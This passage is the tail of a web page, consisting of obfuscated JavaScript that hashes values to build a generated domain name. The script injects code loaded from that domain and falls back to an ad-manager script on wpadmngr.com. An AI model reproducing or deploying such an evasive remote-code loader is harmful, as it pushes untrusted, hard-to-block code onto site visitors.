2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>